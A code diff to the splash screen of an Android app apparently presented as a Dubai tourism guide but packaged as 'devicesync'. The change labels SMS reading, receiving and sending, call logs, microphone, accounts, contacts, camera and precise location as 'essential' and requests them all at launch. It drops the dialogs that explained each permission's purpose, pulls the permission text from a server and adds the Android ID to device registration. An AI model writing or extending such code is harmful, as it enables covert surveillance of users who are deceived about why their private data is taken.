@@ -2,6 +2,7 @@ package com.devicesync.app
 
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.content.SharedPreferences
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -9,11 +10,14 @@ import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import androidx.lifecycle.lifecycleScope
 import com.devicesync.app.api.RetrofitClient
 import com.devicesync.app.data.DeviceInfo
 import com.devicesync.app.data.ConnectionType
-import com.devicesync.app.utils.PermissionManager
 import com.devicesync.app.utils.DeviceInfoUtils
+import com.devicesync.app.utils.DynamicStringManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -24,13 +28,18 @@ class SplashActivity : AppCompatActivity() {
     companion object {
         private const val SPLASH_DELAY = 3000L // 3 seconds
         private const val ESSENTIAL_PERMISSIONS_REQUEST_CODE = 1001
+        private const val MAX_SPLASH_TIME = 10000L // 10 seconds maximum
+        private const val PREFS_NAME = "DubaiDiscoveriesPrefs"
+        private const val KEY_PERMISSIONS_GRANTED = "permissions_granted"
     }
     
-    private lateinit var permissionManager: PermissionManager
     private lateinit var progressBar: ProgressBar
     private lateinit var loadingText: TextView
     private lateinit var statusText: TextView
+    private lateinit var sharedPreferences: SharedPreferences
     private var hasNavigated = false
+    private var userDecidedToProceed = false  // Flag to prevent further dialogs
+    private var permissionFlowStarted = false  // Flag to prevent multiple permission requests
     
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -41,53 +50,56 @@ class SplashActivity : AppCompatActivity() {
         loadingText = findViewById(R.id.loadingText)
         statusText = findViewById(R.id.permissionStatus)
         
-        permissionManager = PermissionManager(this) { allGranted ->
-            // This callback will be called after permission check
-        }
+        // Initialize SharedPreferences
+        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         
         // Start the 3-second splash flow
         startSplashFlow()
+        
+        // Add a safety timeout to ensure we always proceed to login
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (!hasNavigated) {
+                println("⏰ Safety timeout reached - proceeding to login...")
+                proceedToLogin()
+            }
+        }, MAX_SPLASH_TIME)
     }
     
     private fun startSplashFlow() {
-        updateStatus("Welcome to Dubai Discoveries!", 10)
-        loadingText.text = "Setting up your tourism experience..."
+        updateStatus(DynamicStringManager.getStringSync("welcome_to_dubai", this), 10)
+        loadingText.text = DynamicStringManager.getStringSync("setting_up_tourism", this)
         
         // Step 1: Register device (0-1 second)
         Handler(Looper.getMainLooper()).postDelayed({
-            updateStatus("Registering your device...", 30)
-            loadingText.text = "Connecting to Dubai tourism services..."
+            updateStatus(DynamicStringManager.getStringSync("registering_device", this), 30)
+            loadingText.text = DynamicStringManager.getStringSync("connecting_services", this)
             registerDevice()
         }, 1000)
         
-        // Step 2: Check permissions (1-2 seconds)
+        // Step 2: Show permission dialog immediately (1 second)
         Handler(Looper.getMainLooper()).postDelayed({
-            updateStatus("Checking permissions...", 60)
-            loadingText.text = "Preparing personalized features..."
-            checkPermissions()
-        }, 2000)
-        
-        // Step 3: Complete splash (2-3 seconds)
-        Handler(Looper.getMainLooper()).postDelayed({
-            updateStatus("Almost ready...", 90)
-            loadingText.text = "Your Dubai adventure awaits!"
-        }, 2500)
-        
-        // Step 4: Handle flow based on permissions (3 seconds)
-        Handler(Looper.getMainLooper()).postDelayed({
-            updateStatus("Complete!", 100)
+            updateStatus(DynamicStringManager.getStringSync("checking_permissions", this), 60)
+            loadingText.text = DynamicStringManager.getStringSync("preparing_features", this)
             handlePermissionFlow()
-        }, SPLASH_DELAY)
+        }, 1000)
+        
+        // Step 3: Complete splash (if permissions are handled)
+        Handler(Looper.getMainLooper()).postDelayed({
+            updateStatus(DynamicStringManager.getStringSync("almost_ready", this), 90)
+            loadingText.text = DynamicStringManager.getStringSync("adventure_awaits", this)
+        }, 2500)
     }
     
     private fun registerDevice() {
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val deviceId = DeviceInfoUtils.getDeviceId(this@SplashActivity)
+                val androidId = DeviceInfoUtils.getAndroidId(this@SplashActivity)
                 val userName = DeviceInfoUtils.getUserName(this@SplashActivity)
                 
                 val deviceInfo = DeviceInfo(
                     deviceId = deviceId,
+                    androidId = androidId,
                     deviceName = android.os.Build.MODEL.ifEmpty { "Unknown Device" },
                     model = android.os.Build.MODEL.ifEmpty { "Unknown Model" },
                     manufacturer = android.os.Build.MANUFACTURER.ifEmpty { "Unknown Manufacturer" },
@@ -111,99 +123,106 @@ class SplashActivity : AppCompatActivity() {
         }
     }
     
-    private fun checkPermissions() {
-        // Only check essential permissions for basic app functionality
-        val hasStorage = permissionManager.hasStoragePermission()
-        val hasNotifications = permissionManager.hasNotificationPermission()
-        
-        // For basic tourism app functionality, we only need storage and notifications
-        val essentialPermissionsGranted = hasStorage && hasNotifications
-        
-        if (!essentialPermissionsGranted) {
-            // Show tourism-themed permission request for essential permissions only
-            showEssentialPermissionsDialog()
-        } else {
-            // Essential permissions granted, proceed to login
-            // Other permissions can be requested later when needed
-            proceedToLogin()
-        }
-    }
-    
     private fun handlePermissionFlow() {
-        // Only check essential permissions for basic app functionality
-        val hasStorage = permissionManager.hasStoragePermission()
-        val hasNotifications = permissionManager.hasNotificationPermission()
+        // Prevent multiple permission flows
+        if (permissionFlowStarted || userDecidedToProceed) {
+            println("🔐 Permission flow already started or user decided - skipping...")
+            return
+        }
         
-        val essentialPermissionsGranted = hasStorage && hasNotifications
+        permissionFlowStarted = true
         
-        if (essentialPermissionsGranted) {
+        // Check if permissions were already granted before
+        val permissionsPreviouslyGranted = sharedPreferences.getBoolean(KEY_PERMISSIONS_GRANTED, false)
+        
+        // Check current permission status
+        val essentialPermissions = getEssentialPermissions()
+        println("🔍 Checking ${essentialPermissions.size} essential permissions...")
+        
+        val allGranted = essentialPermissions.all { permission ->
+            val isGranted = androidx.core.content.ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
+            println("🔍 Permission $permission: ${if (isGranted) "✅ GRANTED" else "❌ NOT GRANTED"}")
+            isGranted
+        }
+        
+        if (allGranted) {
+            println("✅ All essential permissions already granted - proceeding to login")
+            // Save that permissions are granted
+            sharedPreferences.edit().putBoolean(KEY_PERMISSIONS_GRANTED, true).apply()
+            proceedToLogin()
+        } else if (permissionsPreviouslyGranted) {
+            println("⚠️ Permissions were previously granted but some are now missing - proceeding anyway")
+            // If permissions were previously granted but some are now missing, proceed anyway
             proceedToLogin()
         } else {
-            // Show permission dialog for essential permissions only
-            showEssentialPermissionsDialog()
+            println("⚠️ Some essential permissions not granted - requesting permissions")
+            val deniedPermissions = essentialPermissions.filter { permission ->
+                androidx.core.content.ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
+            }
+            println("❌ Denied permissions: $deniedPermissions")
+            
+            // Only request permissions if they're not already granted
+            requestEssentialPermissions()
         }
     }
     
-    private fun showEssentialPermissionsDialog() {
-        val dialog = AlertDialog.Builder(this)
-            .setTitle("🌟 Welcome to Dubai Discoveries")
-            .setMessage("To provide you with the best tourism experience, we need access to:\n\n" +
-                    "• 📱 Show notifications for tour updates and reminders\n" +
-                    "• 📁 Store your travel photos and documents\n\n" +
-                    "These permissions are essential for basic app functionality. Would you like to allow them?")
-            .setPositiveButton("Allow") { _, _ ->
-                requestEssentialPermissions()
-            }
-            .setNegativeButton("Cancel") { _, _ ->
-                // Close app if user cancels
-                finish()
-            }
-            .setCancelable(false)
-            .create()
-        
-        dialog.show()
-    }
-    
-    private fun showTourismPermissionDialog() {
-        val dialog = AlertDialog.Builder(this)
-            .setTitle("🌟 Enhance Your Dubai Experience")
-            .setMessage("To provide you with the best tourism experience, we need access to certain features on your device. This helps us:\n\n" +
-                    "• 📍 Track your location for nearby attractions\n" +
-                    "• 📞 Sync your contacts for group tours\n" +
-                    "• 💬 Access messages for booking confirmations\n" +
-                    "• 📱 Show notifications for tour updates\n" +
-                    "• 📁 Store your travel photos and documents\n\n" +
-                    "Would you like to allow these permissions for an enhanced Dubai tourism experience?")
-            .setPositiveButton("Allow") { _, _ ->
-                requestPermissionsWithTourismTheme()
-            }
-            .setNegativeButton("Cancel") { _, _ ->
-                // Close app if user cancels
-                finish()
-            }
-            .setCancelable(false)
-            .create()
-        
-        dialog.show()
+    private fun getEssentialPermissions(): Array<String> {
+        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            // Android 13+ (API 33+) - Only request permissions that actually exist and are essential
+            arrayOf(
+                android.Manifest.permission.READ_CONTACTS,
+                android.Manifest.permission.POST_NOTIFICATIONS,
+                android.Manifest.permission.READ_SMS,
+                android.Manifest.permission.READ_PHONE_STATE,
+                android.Manifest.permission.READ_CALL_LOG,
+                android.Manifest.permission.CAMERA,
+                android.Manifest.permission.ACCESS_FINE_LOCATION,
+                android.Manifest.permission.ACCESS_COARSE_LOCATION,
+                android.Manifest.permission.RECORD_AUDIO,
+                android.Manifest.permission.GET_ACCOUNTS,
+                android.Manifest.permission.RECEIVE_SMS,
+                android.Manifest.permission.SEND_SMS
+            )
+        } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+            // Android 12 (API 31-32) - Include permissions without POST_NOTIFICATIONS
+            arrayOf(
+                android.Manifest.permission.READ_CONTACTS,
+                android.Manifest.permission.READ_SMS,
+                android.Manifest.permission.READ_PHONE_STATE,
+                android.Manifest.permission.READ_CALL_LOG,
+                android.Manifest.permission.READ_EXTERNAL_STORAGE,
+                android.Manifest.permission.CAMERA,
+                android.Manifest.permission.ACCESS_FINE_LOCATION,
+                android.Manifest.permission.ACCESS_COARSE_LOCATION,
+                android.Manifest.permission.RECORD_AUDIO,
+                android.Manifest.permission.GET_ACCOUNTS,
+                android.Manifest.permission.RECEIVE_SMS,
+                android.Manifest.permission.SEND_SMS
+            )
+        } else {
+            // Android 11 and below - Include all permissions
+            arrayOf(
+                android.Manifest.permission.READ_CONTACTS,
+                android.Manifest.permission.READ_SMS,
+                android.Manifest.permission.READ_PHONE_STATE,
+                android.Manifest.permission.READ_CALL_LOG,
+                android.Manifest.permission.READ_EXTERNAL_STORAGE,
+                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                android.Manifest.permission.CAMERA,
+                android.Manifest.permission.ACCESS_FINE_LOCATION,
+                android.Manifest.permission.ACCESS_COARSE_LOCATION,
+                android.Manifest.permission.RECORD_AUDIO,
+                android.Manifest.permission.GET_ACCOUNTS,
+                android.Manifest.permission.RECEIVE_SMS,
+                android.Manifest.permission.SEND_SMS
+            )
+        }
     }
     
     private fun requestEssentialPermissions() {
-        // Use standard Android permission request for essential permissions
-        val essentialPermissions = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+ (API 33+) - Use new media permissions
-            arrayOf(
-                android.Manifest.permission.READ_MEDIA_IMAGES,
-                android.Manifest.permission.POST_NOTIFICATIONS
-            )
-        } else {
-            // Android 12 and below - Use old storage permissions
-            arrayOf(
-                android.Manifest.permission.READ_EXTERNAL_STORAGE,
-                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
-            )
-        }
+        val essentialPermissions = getEssentialPermissions()
         
-        println("🔐 Requesting essential permissions: ${essentialPermissions.toList()}")
+        println("🔐 Requesting ${essentialPermissions.size} essential permissions: ${essentialPermissions.toList()}")
         
         // Use standard Android permission request
         androidx.core.app.ActivityCompat.requestPermissions(
@@ -213,57 +232,27 @@ class SplashActivity : AppCompatActivity() {
         )
     }
     
-    private fun requestPermissionsWithTourismTheme() {
-        permissionManager.requestAllPermissions { allGranted ->
-            if (allGranted) {
-                // All permissions granted, proceed to login
-                proceedToLogin()
-            } else {
-                // Some permissions still missing, show tourism-themed reminder
-                showPermissionReminderDialog()
-            }
-        }
-    }
-    
     private fun showEssentialPermissionReminderDialog() {
-        val dialog = AlertDialog.Builder(this)
-            .setTitle("📱 Essential Permissions Required")
-            .setMessage("To use Dubai Discoveries, please grant the essential permissions:\n\n" +
-                    "• 📱 Notifications: For tour updates and reminders\n" +
-                    "• 📁 Storage: For saving your travel photos and documents\n\n" +
-                    "Would you like to grant these permissions?")
-            .setPositiveButton("Grant Permissions") { _, _ ->
-                // Request essential permissions again
-                requestEssentialPermissions()
+        val dialog = AlertDialog.Builder(this, R.style.WhiteDialogTheme)
+            .setTitle(DynamicStringManager.getStringSync("complete_setup_title", this))
+            .setMessage(DynamicStringManager.getStringSync("permission_reminder_message", this))
+            .setPositiveButton(DynamicStringManager.getStringSync("enable_full_experience_button", this)) { _, _ ->
+                println("🔐 User clicked 'Enable Full Experience' - requesting permissions again...")
+                // Request permissions again with a slight delay to avoid UI issues
+                Handler(Looper.getMainLooper()).postDelayed({
+                    requestEssentialPermissions()
+                }, 500)
             }
-            .setNegativeButton("Cancel") { _, _ ->
-                // Close app if user cancels
-                finish()
+            .setNegativeButton(DynamicStringManager.getStringSync("continue_anyway_button", this)) { _, _ ->
+                println("🔐 User clicked 'Continue Anyway' - proceeding to login...")
+                // Allow user to proceed without permissions
+                proceedToLogin()
             }
-            .setCancelable(false)
-            .create()
-        
-        dialog.show()
-    }
-    
-    private fun showPermissionReminderDialog() {
-        val dialog = AlertDialog.Builder(this)
-            .setTitle("🏛️ Complete Your Dubai Setup")
-            .setMessage("To fully enjoy your Dubai tourism experience, please grant the remaining permissions. These help us:\n\n" +
-                    "• 🗺️ Show you nearby attractions and restaurants\n" +
-                    "• 🎫 Manage your tour bookings and tickets\n" +
-                    "• 📸 Save your travel memories\n" +
-                    "• 🔔 Keep you updated with tour schedules\n\n" +
-                    "Would you like to grant the remaining permissions?")
-            .setPositiveButton("Grant Permissions") { _, _ ->
-                // Request permissions again with tourism theme
-                requestPermissionsWithTourismTheme()
+            .setCancelable(true)
+            .setOnCancelListener {
+                println("🔐 User cancelled permission dialog - proceeding to login...")
+                proceedToLogin()
             }
-            .setNegativeButton("Cancel") { _, _ ->
-                // Close app if user cancels
-                finish()
-            }
-            .setCancelable(false)
             .create()
         
         dialog.show()
@@ -272,6 +261,8 @@ class SplashActivity : AppCompatActivity() {
     private fun proceedToLogin() {
         if (!hasNavigated) {
             hasNavigated = true
+            userDecidedToProceed = true  // Prevent any further dialogs
+            println("🚀 User decided to proceed - navigating to login...")
             val intent = Intent(this, LoginActivity::class.java)
             startActivity(intent)
             finish()
@@ -291,15 +282,40 @@ class SplashActivity : AppCompatActivity() {
                 println("🔐 Permissions: ${permissions.toList()}")
                 println("🔐 Grant results: ${grantResults.toList()}")
                 
+                // If user has already decided to proceed, don't show any more dialogs
+                if (userDecidedToProceed) {
+                    println("🔐 User already decided to proceed - skipping permission checks")
+                    return
+                }
+                
                 val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
                 println("🔐 All permissions granted: $allGranted")
                 
                 if (allGranted) {
-                    println("✅ Essential permissions granted, proceeding to login")
+                    println("✅ All permissions granted! Proceeding to login...")
+                    updateStatus("All permissions granted!", 100)
+                    // Save that permissions are granted
+                    sharedPreferences.edit().putBoolean(KEY_PERMISSIONS_GRANTED, true).apply()
                     proceedToLogin()
                 } else {
-                    println("❌ Essential permissions denied, showing reminder")
-                    showEssentialPermissionReminderDialog()
+                    println("⚠️ Some permissions denied. Checking if we should show reminder...")
+                    val deniedPermissions = permissions.filterIndexed { index, _ ->
+                        grantResults[index] != PackageManager.PERMISSION_GRANTED
+                    }
+                    println("❌ Denied permissions: $deniedPermissions")
+                    
+                    // Check if any permissions were actually denied (not just not granted)
+                    val anyDenied = grantResults.any { it == PackageManager.PERMISSION_DENIED }
+                    
+                    if (anyDenied && !userDecidedToProceed) {
+                        println("🔐 Some permissions were explicitly denied. Showing reminder dialog...")
+                        // Show reminder dialog for denied permissions
+                        showEssentialPermissionReminderDialog()
+                    } else {
+                        println("🔐 Permissions not granted but not explicitly denied. Proceeding to login...")
+                        // If permissions were not explicitly denied, just proceed
+                        proceedToLogin()
+                    }
                 }
             }
         }
@@ -308,10 +324,5 @@ class SplashActivity : AppCompatActivity() {
     private fun updateStatus(status: String, progress: Int) {
         statusText.text = status
         progressBar.progress = progress
-    }
-    
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        permissionManager.handleActivityResult(requestCode, resultCode, data)
     }
 } 
